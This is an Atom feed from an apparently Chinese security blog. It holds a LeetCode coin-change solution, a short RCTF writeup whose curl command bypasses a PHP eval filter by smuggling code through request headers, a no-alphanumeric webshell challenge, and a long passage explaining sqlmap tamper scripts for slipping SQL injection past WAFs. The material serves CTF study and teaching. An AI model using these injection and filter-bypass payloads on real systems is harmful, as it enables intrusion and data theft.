<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>wywwzjj&#39;s Blog</title>
  
  <subtitle>爱学习，爱分享，爱生活</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://wywwzjj.top/"/>
  <updated>2019-04-04T01:35:39.472Z</updated>
  <id>https://wywwzjj.top/</id>
  
  <author>
    <name>wywwzjj</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Leetcode-322-Coin_Change</title>
    <link href="https://wywwzjj.top/2019/04/04/Leetcode-322-Coin-Change/"/>
    <id>https://wywwzjj.top/2019/04/04/Leetcode-322-Coin-Change/</id>
    <published>2019-04-04T01:07:35.000Z</published>
    <updated>2019-04-04T01:35:39.472Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>给定不同面额的硬币 coins 和一个总金额 amount。编写一个函数来计算可以凑成总金额所需的最少的硬币个数。如果没有任何一种硬币组合能组成总金额，返回 <code>-1</code>。</p><p><strong>示例 1:</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: coins = [1, 2, 5], amount = 11</span><br><span class="line">输出:<span class="number"> 3 </span></span><br><span class="line">解释:<span class="number"> 11 </span>=<span class="number"> 5 </span>+<span class="number"> 5 </span>+ 1</span><br></pre></td></tr></table></figure><p><strong>示例 2:</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">输入: coins = [2], amount = 3</span></span><br><span class="line"><span class="section">输出: -1</span></span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>考虑状态方程，需描述出组合成总金额所花最少的硬币个数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dp[i][j] 表示使用前 i 种硬币表示总额 j 所用的最少硬币数</span></span><br><span class="line"><span class="comment"># 初始状态 dp[-1][j] = ∞  dp[i][0] = 0</span></span><br><span class="line">dp[i][j] = min(dp[i][j], dp[i<span class="number">-1</span>][j-coin_i*k] + k)</span><br><span class="line"> = min(dp[i][j], dp[i][j-coin_i] + <span class="number">1</span>)</span><br><span class="line"><span class="comment"># 观察发现都具有 dp[i]，进一步压缩，使用滚动数组</span></span><br><span class="line">dp[j] = min(dp[j], dp[j-coin_i] + <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>以<strong>示例 1 </strong>为例</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1qceh5ejjj20qb035gll.jpg" alt></p><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><p><strong>DP</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 执行用时：1672 ms，击败了 39.85% 的用户</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coinChange</span><span class="params">(self, coins: List[int], amount: int)</span> -&gt; int:</span></span><br><span class="line">    dp = [amount+<span class="number">1</span>] * (amount + <span class="number">5</span>)</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> coin <span class="keyword">in</span> coins:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(amount+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> (i - coin &gt;= <span class="number">0</span>):</span><br><span class="line">            dp[i] = min(dp[i], dp[i-coin] + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span> <span class="keyword">if</span> dp[amount] &gt;= amount + <span class="number">1</span> <span class="keyword">else</span> dp[amount]</span><br></pre></td></tr></table></figure><p><strong>DFS + greedy + pruning</strong></p><p>待补充</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;给定不同面额的硬币 coins 和一个总金额 amount。编写一个函数来计算可以凑成总金额所需的最少的硬币个数。如果没有任
      
    
    </summary>
    
    
      <category term="算法" scheme="https://wywwzjj.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>2018_RCTF</title>
    <link href="https://wywwzjj.top/2019/04/02/2018-RCTF/"/>
    <id>https://wywwzjj.top/2019/04/02/2018-RCTF/</id>
    <published>2019-04-02T15:34:37.000Z</published>
    <updated>2019-04-02T15:35:10.432Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) === <span class="string">'f6e5575f93a408c5cb709c73eaa822cb09b4d0f7'</span> ?: <span class="keyword">die</span>();</span><br><span class="line"><span class="string">';'</span> === preg_replace(<span class="string">'/[^\W_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'cmd'</span>]) ? <span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]) : show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">这个绕过有点牛逼：curl <span class="string">"http://xxxx.sandbox.r-cursive.ml:1337/?cmd=eval(next(getallheaders()));"</span> -H <span class="string">"User-Agent: phpinfo();"</span> -H <span class="string">"Accept: asdasd/asdasda"</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Hackme_Writeup</title>
    <link href="https://wywwzjj.top/2019/04/02/Hackme-Writeup/"/>
    <id>https://wywwzjj.top/2019/04/02/Hackme-Writeup/</id>
    <published>2019-04-02T15:23:33.000Z</published>
    <updated>2019-04-02T15:23:33.551Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>无字母数字_webshell</title>
    <link href="https://wywwzjj.top/2019/04/02/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97-webshell/"/>
    <id>https://wywwzjj.top/2019/04/02/无字母数字-webshell/</id>
    <published>2019-04-02T15:19:52.000Z</published>
    <updated>2019-04-02T15:34:08.813Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;
      
    
    </summary>
    
    
      <category term="webshell" scheme="https://wywwzjj.top/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>2019_TCTF_Writeup</title>
    <link href="https://wywwzjj.top/2019/04/02/%C2%962019-TCTF-Writeup/"/>
    <id>https://wywwzjj.top/2019/04/02/2019-TCTF-Writeup/</id>
    <published>2019-04-02T15:10:12.000Z</published>
    <updated>2019-04-02T15:32:19.021Z</updated>
    
    <content type="html"><![CDATA[<h2 id="zer0lfsr"><a href="#zer0lfsr" class="headerlink" title="zer0lfsr"></a>zer0lfsr</h2><h2 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h2><h2 id="Elements"><a href="#Elements" class="headerlink" title="Elements"></a>Elements</h2><h2 id="Ghost-Pepper"><a href="#Ghost-Pepper" class="headerlink" title="Ghost Pepper"></a>Ghost Pepper</h2><h2 id="Wallbreaker-Easy"><a href="#Wallbreaker-Easy" class="headerlink" title="Wallbreaker Easy"></a>Wallbreaker Easy</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;zer0lfsr&quot;&gt;&lt;a href=&quot;#zer0lfsr&quot; class=&quot;headerlink&quot; title=&quot;zer0lfsr&quot;&gt;&lt;/a&gt;zer0lfsr&lt;/h2&gt;&lt;h2 id=&quot;babyrsa&quot;&gt;&lt;a href=&quot;#babyrsa&quot; class=&quot;header
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap tamper 列表</title>
    <link href="https://wywwzjj.top/2019/03/01/SQLMAP_tamper%E5%88%97%E8%A1%A8/"/>
    <id>https://wywwzjj.top/2019/03/01/SQLMAP_tamper列表/</id>
    <published>2019-03-01T15:43:38.000Z</published>
    <updated>2019-03-10T10:26:41.174Z</updated>
    
    <content type="html"><![CDATA[<ul><li>apostrophemask.py 用UTF-8全角字符替换单引号字符</li></ul><ul><li>apostrophenullencode.py 用非法双字节unicode字符替换单引号字符</li></ul><ul><li>appendnullbyte.py 在payload末尾添加空字符编码</li></ul><ul><li>base64encode.py 对给定的payload全部字符使用Base64编码</li></ul><ul><li>between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”</li></ul><ul><li>bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”</li></ul><ul><li>chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</li></ul><ul><li>charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）</li></ul><ul><li>charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</li></ul><ul><li>concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例</li></ul><ul><li>equaltolike.py 用“LIKE”运算符替换全部等于号“=”</li></ul><ul><li>greatest.py 用“GREATEST”函数替换大于号“&gt;”</li></ul><ul><li>halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释</li></ul><ul><li>ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例</li></ul><ul><li>lowercase.py 用小写值替换每个关键字字符</li></ul><ul><li>modsecurityversioned.py 用注释包围完整的查询</li></ul><ul><li>modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询</li></ul><ul><li>multiplespaces.py 在SQL关键字周围添加多个空格</li></ul><ul><li>nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器</li></ul><ul><li>overlongutf8.py 转换给定的payload当中的所有字符</li></ul><ul><li>percentage.py 在每个字符之前添加一个百分号</li></ul><ul><li>randomcase.py 随机转换每个关键字字符的大小写</li></ul><ul><li>randomcomments.py 向SQL关键字中插入随机注释</li></ul><ul><li>securesphere.py 添加经过特殊构造的字符串</li></ul><ul><li>sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs</li></ul><ul><li>space2comment.py 用“/**/”替换空格符</li></ul><ul><li>space2dash.py 用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符</li></ul><ul><li>space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</li></ul><ul><li>space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</li></ul><ul><li>space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</li></ul><ul><li>space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符</li></ul><ul><li>space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</li></ul><ul><li>space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符</li></ul><ul><li>space2plus.py 用加号“+”替换空格符</li></ul><ul><li>space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</li></ul><ul><li>unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”</li></ul><ul><li>unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符</li></ul><ul><li>varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF</li></ul><ul><li>versionedkeywords.py 用MySQL注释包围每个非函数关键字</li></ul><ul><li>versionedmorekeywords.py 用MySQL注释包围每个关键字</li></ul><ul><li>xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</li></ul><p>下面针对 sqlmap 自带的 tamper 做一下简单的解释。</p><h4 id="apostrophemask-py"><a href="#apostrophemask-py" class="headerlink" title="apostrophemask.py:"></a>apostrophemask.py:</h4><blockquote><p>return payload.replace(‘’’, “%EF%BC%87”) if payload else payload</p></blockquote><p>将单引号 url 编码，用于过滤了单引号的情况。</p><blockquote><p>1’ AND ‘1’=’1 <strong>to</strong> 1%EF%BC%87 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="apostrophenullencode-py"><a href="#apostrophenullencode-py" class="headerlink" title="apostrophenullencode.py:"></a>apostrophenullencode.py:</h4><blockquote><p>return payload.replace(‘’’, “%00%27”) if payload else payload</p></blockquote><p>将单引号替换为宽字节 unicode 字符，用于过滤了单引号的情况</p><blockquote><p>1’ AND ‘1’=’1 <strong>to</strong> 1�’ AND �’1�’=�’1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="appendnullbyte-py"><a href="#appendnullbyte-py" class="headerlink" title="appendnullbyte.py:"></a>appendnullbyte.py:</h4><blockquote><p>return “%s%%00” % payload if payload else payload</p></blockquote><p>在你构造的payload后面加一个空字符</p><blockquote><p>1’ AND ‘1’=’1 <strong>to</strong> 1’ AND ‘1’=’1[]</p></blockquote><p><strong>适用数据库：</strong>Access</p><h4 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py:"></a>base64encode.py:</h4><blockquote><p>return base64.b64encode(payload.encode(UNICODE_ENCODING)) if payload else payload</p></blockquote><p>这个看模块名也知道是 base64 编码</p><blockquote><p>1’ AND ‘1’=’1 <strong>to</strong> MScgQU5EICcxJz0nMQ==</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="between-py"><a href="#between-py" class="headerlink" title="between.py:"></a>between.py:</h4><p>这个代码有点长，就不贴代码了，可以自己去查看：</p><p><code>\SQLMap\tamper\between.py</code></p><p>将大于符号和等号用 between 语句替换，用于过滤了大于符号和等号的情况</p><blockquote><p>1 AND A &gt; B <strong>to</strong> 1 AND A NOT BETWEEN 0 AND B</p><p>1 AND A = B <strong>to</strong> 1 AND A BETWEEN B AND B</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink" title="bluecoat.py:"></a>bluecoat.py:</h4><p>用随机的空白字符代替空格，并且将等号替换为 like ，用于过滤了空格和等号的情况</p><blockquote><p>union select <em>from users where id = 1 <strong>to</strong> union%09select</em> from%09users where id like 1</p></blockquote><p><strong>适用数据库：</strong>MySQL 5.1, SGOS</p><h4 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py:"></a>chardoubleencode.py:</h4><p>用 url 编码两次你的 payload</p><blockquote><p>select * from users <strong>to</strong>%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2575%2573%2565%2572</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py:"></a>charencode.py:</h4><p>用 url 编码一次你的 payload</p><blockquote><p>select * from users <strong>to</strong>%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="charunicodeencode-py："><a href="#charunicodeencode-py：" class="headerlink" title="charunicodeencode.py："></a>charunicodeencode.py：</h4><p>用 unicode 编码 payload ，只编码非编码字符</p><blockquote><p>select * from users <strong>to</strong>u0073u0065u006cu0065u0063u0074u0020u002au0020u0066u0072u006fu006du0020u0075u0073u0065u0072u0073</p></blockquote><p><strong>适用数据库：</strong>ALL，但是需要 asp 和 asp.net 环境</p><h4 id="commalesslimit-py："><a href="#commalesslimit-py：" class="headerlink" title="commalesslimit.py："></a>commalesslimit.py：</h4><p>将 payload 中的逗号用 offset 代替，用于过滤了逗号并且是两个参数的情况</p><blockquote><p>limit 2,1 <strong>to</strong> limit 1 offset 2</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="commalessmid-py："><a href="#commalessmid-py：" class="headerlink" title="commalessmid.py："></a>commalessmid.py：</h4><p>将 payload 中的逗号用 from for 代替，用于过滤了逗号并且是三参数的情况</p><blockquote><p>mid(version(), 1, 1) <strong>to</strong> mid(version() from 1 for 1)</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="commentbeforeparentheses-py："><a href="#commentbeforeparentheses-py：" class="headerlink" title="commentbeforeparentheses.py："></a>commentbeforeparentheses.py：</h4><blockquote><p>retVal = re.sub(r”b(w+)(“, “g<1>/**/(“, retVal)</1></p></blockquote><p>在某个单词后的第一个括号前面加入 /**/ ，用于过滤了函数的情况</p><blockquote><p>union select group_concat(table_name) <strong>to</strong> union select group_concat/**/(table_name)</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="concat2concatws-py："><a href="#concat2concatws-py：" class="headerlink" title="concat2concatws.py："></a>concat2concatws.py：</h4><blockquote><p>payload = payload.replace(“CONCAT(“, “CONCAT_WS(MID(CHAR(0),0,0),”)</p></blockquote><p>用于过滤了 concat 函数的情况</p><blockquote><p>concat(1,2) <strong>to</strong> concat_ws(mid(char(0), 0, 0), 1, 2)</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="equaltolike-py："><a href="#equaltolike-py：" class="headerlink" title="equaltolike.py："></a>equaltolike.py：</h4><blockquote><p>retVal = re.sub(r”s<em>=s</em>“, “ LIKE “, retVal)</p></blockquote><p>将等号用 like 代替，用于过滤了等号的情况</p><blockquote><p>select <em>from users where id=1 <strong>to</strong> select</em> from users where id like 1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="escapequotes-py："><a href="#escapequotes-py：" class="headerlink" title="escapequotes.py："></a>escapequotes.py：</h4><blockquote><p>return payload.replace(“‘“, “‘“).replace(‘“‘, ‘“‘)</p></blockquote><p>将单引号转换成 \’ ，双引号转换成 \” ，用于过滤了单引号或双引号的情况</p><blockquote><p>1’ and 1=1–+ <strong>to</strong> 1\’ and 1=1–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="greatest-py："><a href="#greatest-py：" class="headerlink" title="greatest.py："></a>greatest.py：</h4><p>用 greatest 代替大于符号，用于大于符号被过滤了的情况</p><blockquote><p>1 and a&gt;b <strong>to</strong> 1 and greatest(a,b+1)=a</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="halfversionedmorekeywords-py："><a href="#halfversionedmorekeywords-py：" class="headerlink" title="halfversionedmorekeywords.py："></a>halfversionedmorekeywords.py：</h4><p>在关键字前添加注释，用于过滤了关键字的情况</p><blockquote><p>union select 1,2 <strong>to</strong> /<em>!0union/</em>!0select 1,2</p></blockquote><p><strong>适用数据库：</strong>MySQL &lt; 5.1</p><h4 id="htmlencode-py："><a href="#htmlencode-py：" class="headerlink" title="htmlencode.py："></a>htmlencode.py：</h4><blockquote><p>return re.sub(r”<a href="http://www.myh0st.cn/index.php/archives/881/#fn-1" target="_blank" rel="noopener">1</a>“, lambda match: “&amp;#%d;” % ord(match.group(0)), payload) if payload else payload</p></blockquote><p>从名字就知道是将 payload 进行 html 编码</p><blockquote><p>1’ and 1=1–+ <strong>to</strong> 1’ and 1=1–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="ifnull2ifisnull-py："><a href="#ifnull2ifisnull-py：" class="headerlink" title="ifnull2ifisnull.py："></a>ifnull2ifisnull.py：</h4><p>将 ifnull() 函数转为 if(isnull()) 函数，用于过滤了 ifnull 函数的情况</p><blockquote><p>ifnull(1, 2) <strong>to</strong> if(isnull(1), 2, 1)</p></blockquote><p><strong>适用数据库：</strong>MySql</p><h4 id="informationschemacomment-py："><a href="#informationschemacomment-py：" class="headerlink" title="informationschemacomment.py："></a>informationschemacomment.py：</h4><blockquote><p>retVal = re.sub(r”(?i)(information_schema).”, “g<1>/**/.”, payload)</1></p></blockquote><p>在 information_schema 后面加上 /**/ ，用于绕过对 information_schema 的情况</p><blockquote><p>select table_name from information_schema.tables <strong>to</strong> select table_name from information_schema/**/.tables</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="lowercase-py："><a href="#lowercase-py：" class="headerlink" title="lowercase.py："></a>lowercase.py：</h4><p>将 payload 里的大写转为小写</p><blockquote><p>UNION SELECT <strong>to</strong> union select</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="modsecurityversioned-py："><a href="#modsecurityversioned-py：" class="headerlink" title="modsecurityversioned.py："></a>modsecurityversioned.py：</h4><p>用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf</p><blockquote><p>1 and 2&gt;1–+ <strong>to</strong> 1 /<em>!30874and 2&gt;1</em>/–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="modsecurityzeroversioned-py："><a href="#modsecurityzeroversioned-py：" class="headerlink" title="modsecurityzeroversioned.py："></a>modsecurityzeroversioned.py：</h4><p>用注释来包围完整的查询语句，用于绕过 waf ，和上面类似</p><blockquote><p>1 and 2&gt;1–+ <strong>to</strong> 1 /<em>!00000and 2&gt;1</em>/–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="multiplespaces-py："><a href="#multiplespaces-py：" class="headerlink" title="multiplespaces.py："></a>multiplespaces.py：</h4><p>在关键字周围添加多个空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union select 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="nonrecursivereplacement-py："><a href="#nonrecursivereplacement-py：" class="headerlink" title="nonrecursivereplacement.py："></a>nonrecursivereplacement.py：</h4><p>关键字双写，可用于关键字过滤</p><blockquote><p>union select 1,2–+ <strong>to</strong> uniounionn selecselectt 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="overlongutf8-py："><a href="#overlongutf8-py：" class="headerlink" title="overlongutf8.py："></a>overlongutf8.py：</h4><p>这个不是很懂，也去网上搜了下，都说是”转换给定的 payload 当中的所有字符“，类似空格大于小于这种</p><blockquote><p>select field from table where 2&gt;1 <strong>to</strong></p><p>select%C0%AAfield%C0%AAfromtable%C0%AAwhere%C0%AA2%C0%BE1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="percentage-py："><a href="#percentage-py：" class="headerlink" title="percentage.py："></a>percentage.py：</h4><p>用百分号来绕过关键字过滤，具体是在关键字的每个字母前面都加一个百分号</p><blockquote><p>select <em>from users <strong>to</strong> %s%e%l%e%c%t</em> %f%r%o%m %u%s%e%r%s</p></blockquote><p><strong>适用数据库：</strong>ALL, 但是需要 ASP 环境</p><h4 id="plus2concat-py："><a href="#plus2concat-py：" class="headerlink" title="plus2concat.py："></a>plus2concat.py：</h4><p>用 concat 函数来替代加号，用于加号被过滤的情况</p><blockquote><p>select char(13)+char(114)+char(115) from user <strong>to</strong> select concat(char(113),char(114),char(115)) from user</p></blockquote><p><strong>适用数据库：</strong>SQL Server 2012+</p><h4 id="plus2fnconcat-py："><a href="#plus2fnconcat-py：" class="headerlink" title="plus2fnconcat.py："></a>plus2fnconcat.py：</h4><p>用 fn concat 来替代加号，和上面类似</p><blockquote><p>select char(13)+char(114)+char(115) from user <strong>to</strong> select {fn concat({ fn concat(char(113),char(114))},char(115))} from user</p></blockquote><p><strong>适用数据库：</strong>Microsoft SQL Server 2008+</p><h4 id="randomcase-py："><a href="#randomcase-py：" class="headerlink" title="randomcase.py："></a>randomcase.py：</h4><p>将 payload 随机大小写，可用于大小写绕过的情况</p><blockquote><p>union select 1,2–+ <strong>to</strong> UniOn SElect 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="randomcomments-py："><a href="#randomcomments-py：" class="headerlink" title="randomcomments.py："></a>randomcomments.py：</h4><p>在 payload 的关键字中间随机插入 /**/ ，可用于绕过关键字过滤</p><blockquote><p>union select 1,2–+ <strong>to</strong> un/<strong>/ion sele/</strong>/ct 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="securesphere-py："><a href="#securesphere-py：" class="headerlink" title="securesphere.py："></a>securesphere.py：</h4><blockquote><p>return payload + “ and ‘0having’=’0having’” if payload else payload</p></blockquote><p>在 payload 后面加入字符串，可以自定义</p><blockquote><p>1’ and 1=1 <strong>to</strong> 1’ and 1=1 ‘0having’=’0having’</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="sp-password-py："><a href="#sp-password-py：" class="headerlink" title="sp_password.py："></a>sp_password.py：</h4><blockquote><p>retVal = “%s%ssp_password” % (payload, “– “ if not any(_ if <em>in payload else None for</em> in (‘#’, “– “)) else “”)</p></blockquote><p>在 payload 语句后添加 ssp_password ，用于迷惑数据库日志</p><blockquote><p>1’ and 1=1–+ <strong>to</strong> 1 and 1=1– sp_password</p></blockquote><p><strong>适用数据库：</strong>MSSQL</p><h4 id="space2comment-py："><a href="#space2comment-py：" class="headerlink" title="space2comment.py："></a>space2comment.py：</h4><p>用 /**/ 替代空格，用于空格的绕过</p><blockquote><p>union select 1,2–+ <strong>to</strong> union/<strong>/select/</strong>/1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="space2dash-py："><a href="#space2dash-py：" class="headerlink" title="space2dash.py："></a>space2dash.py：</h4><p>用注释符–和一个随机字符串加一个换行符替换控制符</p><p>?union select 1,2–+ <strong>to</strong> union–HSHjsJh%0Aselect–HhjHSJ%0A1,2–+</p><p><strong>适用数据库：</strong>MSSQL、 SQLite</p><h4 id="space2hash-py："><a href="#space2hash-py：" class="headerlink" title="space2hash.py："></a>space2hash.py：</h4><p>和上面类似，不过这儿是用#注释符</p><blockquote><p>union select 1,2–+ <strong>to</strong> union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="space2morecomment-py："><a href="#space2morecomment-py：" class="headerlink" title="space2morecomment.py："></a>space2morecomment.py：</h4><p>将空格用 /<strong>_</strong>/ 替代</p><blockquote><p>union select 1,2–+ <strong>to</strong> union/<strong>_</strong>/select/<strong>_</strong>/1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="space2morehash-py："><a href="#space2morehash-py：" class="headerlink" title="space2morehash.py："></a>space2morehash.py：</h4><p>和 space2hash.py 类似，但是这儿多一个 # 和换行符，具体看一下对比：</p><blockquote><p>space2hash.py： union select 1,2–+ <strong>to</strong> union %23 HSHjsJh %0A select %23 HhjHSJ %0A1,2–+</p><p>space2morehash.py：union select 1,2–+ <strong>to</strong> union %23 HSHjsJh %0A select %23 HhjHSJ %0A%23 HJHJhj %0A 1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p><h4 id="space2mssqlblank-py："><a href="#space2mssqlblank-py：" class="headerlink" title="space2mssqlblank.py："></a>space2mssqlblank.py：</h4><blockquote><p>blanks = (‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, 